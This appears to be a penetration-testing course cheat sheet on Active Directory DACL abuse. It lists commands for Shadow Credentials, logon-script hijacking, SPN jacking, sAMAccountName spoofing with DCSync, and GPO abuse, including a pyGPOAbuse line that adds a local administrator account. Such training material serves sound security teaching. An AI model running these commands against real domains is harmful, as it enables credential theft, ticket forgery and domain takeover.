# Dacl Attacks Ii


---
## Page 1

Shadow Credentials
Command
Description
xfreerdp /u:<USER> /p:<PASSWORD> /d:<DOMAIN> /v:
<IP> /dynamic-resolution /drive:.,linux
Connect to RDP with xfreerdp
Get-DomainUser -Filter '(msDS-
KeyCredentialLink=*)'
Use PowerView to query for
users with msDS-
KeyCredentialLink attribute not
empty
.\Whisker.exe list /target:<TARGET>
List Key Credential attribute
with Whisker
.\Whisker.exe add /target:<TARGET>
Add key credentials with
Whisker
.\Rubeus.exe asktgt /user:<USER> /certificate:
<CERTIFICATE> /password:"<PASSWORD>" /domain:
<DOMAIN> /dc:<DC> /getcredentials /show
Retrieve TGT and NTLM hash
with Rubeus
.\Rubeus.exe createnetonly
/program:powershell.exe /show
Create sacrificial logon session
with Rubeus
.\Rubeus.exe ptt /ticket:<BASE64>
Pass the ticket using Gabriel's
TGT with Rubeus
.\Whisker.exe remove /target:<TARGET> /deviceid:
<DEVICEID>
Remove specific key credential
value with Whisker
DACL ATTACKS II
CHEAT SHEET

---
## Page 2

Command
Description
.\Whisker.exe clear /target:<TARGET>
Clear all key credentials with
Whisker
Get-DomainObjectAcl -Identity <TARGET>
Get the ACEs of a user with
PowerView
python3 examples/dacledit.py -principal <USER> -
target <TARGET> -dc-ip <DC_IP>
<DOMAIN>'/'<USER>':'<PASSWORD>'
Get the ACEs of a user with
dacledit
python3 pywhisker.py -d <DOMAIN> -u <USER> -p
<PASSWORD> --target <TARGET> --action add
Add key credentials from Linux
with pyWhisker
python3 gettgtpkinit.py -cert-pfx <CERTIFICATE> -
pfx-pass <PASSWORD> <DOMAIN>/<USER> <CCACHE_FILE>
Use gettgtpkinit.py to generate
TGT
KRB5CCNAME=<CCACHE_FILE> python3 getnthash.py -
key <KEY> <DOMAIN>/<USER>
Extract NT hash with
getnthash.py
KRB5CCNAME=<CCACHE_FILE> smbclient.py -k -no-pass
<DC>
Connect to a shared folder
using TGT with smbclient
Logon Scripts
Command
Description
bloodyAD --host "<DC_IP>" -d "<DOMAIN>" -u "<USER>" -p
'<PASSWORD>' set object <TARGET_USER> scriptPath -v
'<PATH>'
Set scriptPath with
bloodyAD
bloodyAD --host "<DC_IP>" -d "<DOMAIN>" -u "<USER>" -p
'<PASSWORD>' get object <TARGET_USER> --attr scriptPath
Get scriptPath with
bloodyAD
smbcacls //<DC_IP>/NETLOGON <DIR> -U <USER>%'PASSWORD'
Display ACLs on an NT
file or directory name
with smbcacls
pywerview get-objectacl --name '<TARGET_USER>' -w
<DOMAIN> -t <DC_IP> -u '<USER>' -p '<PASSWORD>' --
resolve-sids --resolve-guids
Get the ACEs of <USER>
over <TARGET_USER> with
PywerView

---
## Page 3

Command
Description
python3 examples/dacledit.py -principal '<USER>' -
target '<TARGET_USER>' -dc-ip <DC_IP>
<DOMAIN>'/'<USER>':'<PASSWORD>'
Get the ACEs of <USER>
over <TARGET_USER> with
dacledit
./adalanche-linux-x64-v<VERSION> collect
activedirectory --domain <DOMAIN> --server <DC_IP> --
username '<USER>' --password '<PASSWORD>'
Collect data from AD
with Adalanche
./adalanche-linux-x64-v<VERSION> analyze --datapath
<DATAPATH>
Launch interactive
discovery tool with
Adalanche
Set-DomainObject <TARGET_USER> -Set
@{'scriptPath'='<PATH>'}
Modify scriptPath with
PowerView
Get-DomainObject <TARGET_USER> -Properties scriptPath
Get scriptPath with
PowerView
ls $env:LOGONSERVER\NETLOGON
List available folders
within NETLOGON with
PowerShell
icacls $env:LOGONSERVER\NETLOGON\<DIR>
Determine permissions
on a folder within
NETLOGON with icacls
.\Invoke-ScriptSentry.ps1
Run ScriptSentry to
discover
misconfigurations in
logon scripts
SPN Jacking
Command
Description
xfreerdp /u:<USER> /p:<PASSWORD> /d:
<DOMAIN> /v:<IP> /dynamic-resolution
/drive:.,linux
Connect to RDP with xfreerdp
MATCH p=(n:User)-[r1:WriteSPN*1..]->
(c:Computer) RETURN p
Cypher query to list WriteSPN rights
in BloodHound

---
## Page 4

Command
Description
Get-DomainComputer | Get-DomainObjectAcl -
ResolveGUIDs | ?{$_.SecurityIdentifier -eq
$(ConvertTo-SID <USER>)}
PowerView command to list
WriteSPN permissions for a user
Get-DomainComputer -TrustedToAuth | select
name, msds-allowedtodelegateto
PowerView command to list
computers with constrained
delegation
Get-ConstrainedDelegation -CheckOrphaned
List orphaned SPNs with Get-
ConstrainedDelegation.ps1
Set-DomainObject -Identity <TARGET> -Set
@{serviceprincipalname='<SPN>'} -Verbose
PowerView command to assign an
orphaned SPN to a target machine
.\Rubeus.exe s4u /domain:<DOMAIN> /user:
<USER> /rc4:<HASH> /impersonateuser:<ADMIN>
/msdsspn:"<SPN>" /nowrap
Execute S4U attack to forge a ticket
as Administrator to the target
machine
.\Rubeus.exe tgssub /ticket:<BASE64>
/altservice:<SERVICE>
Rubeus command to alter the service
name and hostname of a ticket
Set-DomainObject -Identity <TARGET> -Clear
'serviceprincipalname' -Verbose
Clear an SPN from a target machine
with PowerView
Get-ConstrainedDelegation
List servers configured for
Constrained Delegation with Get-
ConstrainedDelegation.ps1
Set-DomainObject -Identity <TARGET> -Set
@{serviceprincipalname='<SPN>'} -Verbose
Add a specific SPN to a target
machine with PowerView
.\Rubeus.exe ptt /ticket:<BASE64>
Perform a pass-the-ticket attack
using Rubeus
proxychains4 -q findDelegation.py -target-
domain <DOMAIN> -dc-ip <DC_IP> -dc-host
<DC_HOST> <DOMAIN>/<USER>:<PASSWORD>
Find constrained delegation rights
using proxychains and
findDelegation.py from Impacket
proxychains4 -q python3 addspn.py <DC_IP> -
u '<DOMAIN>/<USER>' -p <PASSWORD> --clear -
t '<TARGET>'
Clear SPN from a target machine
using proxychains and addspn.py

---
## Page 5

Command
Description
proxychains4 -q getST.py -spn '<SPN>' -
impersonate <USER> '<DOMAIN>/<ACCOUNT>' -
hashes :<HASH> -dc-ip <DC_IP>
Impersonate a user and request a
service ticket with proxychains and
getST.py
proxychains4 -q python3 tgssub.py -in
<TICKET_FILE> -altservice "<SERVICE>" -out
<NEW_TICKET_FILE>
Modify a ticket's service name using
proxychains and tgssub.py
describeTicket.py <TICKET_FILE>
Describe a ticket using
describeTicket.py from Impacket
KRB5CCNAME=<TICKET_FILE> smbexec.py -k -no-
pass <TARGET>
Execute a command on a remote
machine using a ticket with
smbexec.py from Impacket
proxychains4 -q getST.py -spn '<SPN>' -
impersonate <USER> '<DOMAIN>/<ACCOUNT>' -
hashes :<HASH> -dc-ip <DC_IP> -altservice "
<SERVICE>"
Impersonate a user, request a
service ticket, and change its
attributes in one command using
proxychains and getST.py
for spn in $(cat <SPN_FILE>);do
proxychains4 -q python3 addspn.py <DC_IP> -
u '<DOMAIN>/<USER>' -p <PASSWORD> -t
'<TARGET>' --spn $spn;done
Restore SPNs using a for loop and
addspn.py
sAMAccountName Spoofing
Command
Description
xfreerdp /u:<USER> /p:<PASSWORD> /d:<DOMAIN> /v:
<IP> /dynamic-resolution /drive:.,linux
Connect to RDP with xfreerdp
.\noPac.exe scan -domain <DOMAIN> -user <USER> -
pass <PASSWORD>
Scan for NoPAC vulnerability
with noPac on Windows
(Get-DomainObject -SearchScope Base)."ms-ds-
machineaccountquota"
PowerView command to
query ms-DS-
MachineAccountQuota attribute
Get-DomainComputer -Filter '(ms-DS-CreatorSID=*)'
-Properties name,ms-ds-creatorsid
PowerView command to list
machines created by specific
users

---
## Page 6

Command
Description
New-MachineAccount -MachineAccount "<ACCOUNT>" -
Password $password -Domain <DOMAIN> -
DomainController <DC_IP>
PowerMad command to
create a machine account
Set-DomainObject -Identity '<ACCOUNT>$' -Clear
'serviceprincipalname' -Domain <DOMAIN> -
DomainController <DC_IP>
PowerView command to clear
SPNs from a machine
account
Set-MachineAccountAttribute -MachineAccount "
<ACCOUNT>" -Value "<VALUE>" -Attribute
samaccountname -Domain <DOMAIN> -DomainController
<DC_IP>
PowerMad command to
change sAMAccountName
attribute
.\Rubeus.exe asktgt /user:<USER> /password:
<PASSWORD> /domain:<DOMAIN> /dc:<DC_IP> /nowrap
Rubeus command to request
a TGT as a machine account
.\Rubeus.exe s4u /self /impersonateuser:<USER>
/altservice:"<SERVICE>" /dc:<DC_IP> /ptt /ticket:
<TICKET>
Rubeus command to obtain a
service ticket with S4U2self
.\mimikatz.exe "lsadump::dcsync /domain:<DOMAIN>
/kdc:<DC_HOST> /user:<USER>" exit
Mimikatz command to
perform a DCSync attack
python3 noPac/scanner.py -dc-ip <DC_IP>
<DOMAIN>/<USER>:<PASSWORD> -use-ldap
NoPac command to scan for
vulnerability from Linux
python3 bloodyAD.py -d <DOMAIN> -u <USER> -p
<PASSWORD> --host <DC_IP> get object <ACCOUNT>
BloodyAD command to get
information about an account
python3 bloodyAD.py -d <DOMAIN> -u <USER> -p
<PASSWORD> --host <DC_IP> set object <ACCOUNT>
<ATTRIBUTE>
BloodyAD command to clear
or set an attribute of an
account
getTGT.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip
<DC_IP>
Impacket command to
request a TGT
KRB5CCNAME=<TICKET_FILE> getST.py <DOMAIN>/<USER>
-self -impersonate <USER> -altservice <SERVICE> -k
-no-pass -dc-ip <DC_IP>
Impacket command to
request a S4U2self service
ticket
KRB5CCNAME=<TICKET_FILE> psexec.py <DC_HOST> -k -
no-pass
Impacket command to
execute commands on a
remote machine using a
service ticket

---
## Page 7

GPO Attacks
Command
Description
$userSID = ConvertTo-SID <NAME>
Convert a
username to SID
with PowerView
Get-DomainGPO
Retrieve all
GPOs created in
the current
domain
Get-DomainObject -SearchScope Base -Properties gplink
Search which
GPOs are
applied to the
Domain
Get-DomainObjectAcl -ResolveGUIDs
Get the Active
Directory rights
affecting the
GPO
ConvertFrom-SID S-1-5-21-831407601-1803900599-2479021482-1604
Convert the
SecurityIdentifier
to the group
name
Get-DomainGroupMember "<NAME>"
Get group
membership
Get-DomainSite -Properties gplink
Get gplink on
Sites
Get-DomainOU | select name, gplink
Get gplink on OU
Get-DomainOU | foreach { $ou = $_.distinguishedname; Get-
DomainComputer -SearchBase $ou -Properties dnshostname |
select @{Name='OU';Expression={$ou}},
@{Name='FQDN';Expression={$_.dnshostname}} }
List computers
within each OU
New-GPO -Name TestGPO -Comment "This is a test GPO."
Create a New
GPO

---
## Page 8

Command
Description
New-GPLink -Name TestGPO -Target
"OU=TestOU,DC=inlanefreight,DC=local"
Link a GPO to an
OU
Get-GPOEnumeration
Get GPOs where
users have
modification
rights
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <NAME> --
GPOName "Default Security Policy - WKS"
Abusing GPOs
rights with
SharpGPOAbuse
proxychains4 -q python3 GPOwned.py -u <NAME> -p <PASSWORD> -d
inlanefreight.local -dc-ip 172.16.92.10 -gpcmachine -listgpo
List GPOs with
GPOwned
proxychains4 -q python3 GPOwned.py -u <NAME> -p <PASSWORD> -d
inlanefreight.local -dc-ip 172.16.92.10 -gpcmachine -
listgplink
List GPO Links
with GPOwned
proxychains4 -q python3 examples/dacledit.py
inlanefreight.local/<NAME>:<PASSWORD> -target-dn "CN=
{31B2F340-016D-11D2-945F-
00C04FB984F9},CN=Policies,CN=System,DC=inlanefreight,DC=local"
-dc-ip 172.16.92.10
Query GPO
rights with
DACLEdit
proxychains4 -q python3 GPOwned.py -u <NAME> -p <PASSWORD> -d
inlanefreight.local -dc-ip 172.16.92.10 -gpcmachine -backup
backupgpo -name "{31B2F340-016D-11D2-945F-00C04FB984F9}"
Backup GPO
with GPOwned
proxychains4 -q python3 pygpoabuse.py
inlanefreight.local/<NAME>:<PASSWORD> -gpo-id EF1EBF2A-08F2-
48E0-9D2E-67D9F2CE875D -command "net user plaintext
Password1234 /add && net localgroup Administrators plaintext
/add" -taskname "PT_LocalAdmin" -description "this is a GPO
test" -dc-ip 172.16.92.10 -v
Abusing GPOs
with
pyGPOAbuse